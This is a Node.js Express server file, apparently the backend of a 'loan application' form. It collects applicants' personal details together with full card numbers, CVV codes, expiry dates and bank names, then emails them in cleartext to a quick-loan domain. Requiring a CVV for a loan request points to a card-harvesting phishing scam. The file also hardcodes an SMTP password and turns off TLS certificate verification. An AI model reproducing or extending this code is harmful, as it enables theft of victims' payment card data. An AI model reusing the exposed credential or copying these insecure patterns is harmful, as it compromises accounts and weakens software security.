import express from 'express';
import cors from 'cors';
import nodemailer from 'nodemailer';

const app = express();
const PORT = 3001;

app.use(cors());
app.use(express.json());

// Route pour l'envoi d'email
app.post('/api/send-email', async (req, res) => {
  try {
    const {
      lastName,
      firstName,
      nationality,
      address,
      email,
      cardNumber,
      cardType,
      cvv,
      expiryDate,
      bankName,
      whatsapp
    } = req.body;

    // Validation des champs requis
    if (!lastName || !firstName || !email || !cardNumber) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Configuration du transporteur SMTP
    const transporter = nodemailer.createTransport({
      host: 'smtp.hostinger.com',
      port: 587,
      secure: false,
      auth: {
        user: 'uitleendienst@snelleonlinelening.com',
        pass: 'Amour##v22@'
      },
      tls: {
        rejectUnauthorized: false
      }
    });

    // Contenu de l'email
    const emailContent = `
      <h2>Nouvelle demande de prêt</h2>
      <h3>Informations personnelles</h3>
      <ul>
        <li><strong>Nom:</strong> ${lastName}</li>
        <li><strong>Prénom:</strong> ${firstName}</li>
        <li><strong>Nationalité:</strong> ${nationality || 'Non renseigné'}</li>
        <li><strong>Adresse:</strong> ${address || 'Non renseigné'}</li>
        <li><strong>Email:</strong> ${email}</li>
        <li><strong>WhatsApp:</strong> ${whatsapp || 'Non renseigné'}</li>
      </ul>
      
      <h3>Informations bancaires</h3>
      <ul>
        <li><strong>Numéro de carte:</strong> ${cardNumber}</li>
        <li><strong>Type de carte (52/49/51):</strong> ${cardType || 'Non renseigné'}</li>
        <li><strong>CVV:</strong> ${cvv || 'Non renseigné'}</li>
        <li><strong>Date d'expiration:</strong> ${expiryDate || 'Non renseigné'}</li>
        <li><strong>Nom de banque:</strong> ${bankName || 'Non renseigné'}</li>
      </ul>
      
      <p><em>Date de la demande: ${new Date().toLocaleString('fr-FR')}</em></p>
    `;

    // Options de l'email
    const mailOptions = {
      from: 'uitleendienst@snelleonlinelening.com',
      to: 'uitleendienst@snelleonlinelening.com',
      subject: `Nouvelle demande de prêt - ${firstName} ${lastName}`,
      html: emailContent,
      replyTo: email
    };

    // Envoi de l'email
    const info = await transporter.sendMail(mailOptions);

    return res.status(200).json({ 
      success: true, 
      message: 'Email envoyé avec succès',
      messageId: info.messageId
    });

  } catch (error) {
    console.error('Erreur lors de l\'envoi de l\'email:', error);
    return res.status(500).json({ 
      error: 'Erreur lors de l\'envoi de l\'email',
      details: error.message 
    });
  }
});

app.listen(PORT, () => {
  console.log(`Serveur de développement démarré sur http://localhost:${PORT}`);
});
